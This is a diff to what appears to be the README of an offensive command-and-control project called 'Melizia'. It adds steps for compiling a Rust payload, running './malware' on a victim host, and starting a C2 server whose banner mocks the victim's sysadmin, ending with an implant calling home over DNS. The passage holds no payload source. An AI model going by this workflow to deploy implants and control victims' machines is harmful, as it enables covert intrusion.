@@ -46,7 +46,51 @@ Generated payload with hash :: b'8822a96ba043c606b16ede401cb4a22f2a57c63214311c4
 
 ###### 3 - Compile payload
 ```
+attacker_stager_server@Stager:~/Desktop/babagola/migrate$ cargo build --release --target=x86_64-unknown-linux-musl
+[...]
+warning: `migrate` (bin "migrate") generated 147 warnings
+    Finished release [optimized] target(s) in 0.18s
+warning: the following packages contain code that will be rejected by a future version of Rust: rustc-serialize v0.3.24
+note: to see what the problems were, use the option `--future-incompat-report`, or run `cargo report future-incompatibilities --id 1051`
+```
 
+###### 4 - run (Victim)
+```
+user@Ubuntu:$ ./malware 
+[debug information]
+```
+
+##### 5 - control!
+```
+threatactor@C2Server:~/C2_Melizia$ sudo python3.10 c2.py 
+sudo: unable to resolve host TestingC2: Resource temporarily unavailable
+ Melizia C2 
+Pwned by trololo gang! kek kek keke kekw
+- "SYSADMIN VOCÊ ESTÁ SENDO HIPNOTIZADO, ESQUEÇA QUE ESSA OWNADA EXISTIU"
+        |) /\ |\ | /`  |
+        |) \/ | \| \]  .
+          __________         |) /\ |\ | /`  |
+         /________ /|        |) \/ | \| \]  .
+        |   X|I   | |
+        |    |    | | |) /\ |\ | /`  |
+        |IX  * III| | |) \/ | \| \]  .
+        |    |    | |
+        |____VI___| |         |) /\ |\ | /`  |
+        |    /    | |         |) \/ | \| \]  .
+        |   /     | |
+        |  /      | |     |) /\ |\ | /`  |
+        |( )      | |     |) \/ | \| \]  .
+        |_________|/
+                     |) /\ |\ | /`  |
+                     |) \/ | \| \]  .
+
+
+Ctrl+C is disabled! please use "exit" to exit from Melizia
+Use "help" to see the available commands!
+[!] DNS Server started
+
+(Melizia)> A spaceship arrived!
+"92994c589f860bab7af687fc3525d3de445812f52e951f5cf2d04432751a1b8c" Called home!
 ```
 
 
